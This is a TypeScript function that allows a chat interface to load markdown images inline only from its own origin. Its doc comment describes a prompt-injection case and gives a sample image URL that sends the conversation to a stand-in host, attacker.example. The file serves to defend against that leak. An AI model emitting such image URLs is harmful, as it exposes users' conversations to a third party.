/**
 * Whether a markdown image in chat output may be loaded inline.
 *
 * Model output is untrusted, and an image is the one markdown element the browser fetches without a
 * click. A prompt-injected answer (an asset's metadata, a transcript, a web page the agent read)
 * can emit `![](https://attacker.example/?q=<conversation>)` and the bare render leaks the
 * conversation to that host. Only images served by this deployment load inline; anything else is
 * shown as a link the user can choose to follow.
 *
 * @param src the URL after react-markdown's own `urlTransform` (dangerous schemes already blanked)
 * @param origin the page origin, `window.location.origin` in the browser
 */
export function isInlineImageAllowed(src: string | undefined | null, origin: string): boolean {
  if (!src) return false;
  const trimmed = src.trim();
  if (trimmed === "") return false;
  // Protocol-relative ("//host/x") is an absolute URL to another host, not a path.
  if (trimmed.startsWith("//") || trimmed.startsWith("\\")) return false;
  let resolved: URL;
  try {
    resolved = new URL(trimmed, origin);
  } catch {
    return false;
  }
  if (resolved.protocol !== "http:" && resolved.protocol !== "https:") return false;
  return resolved.origin === origin;
}
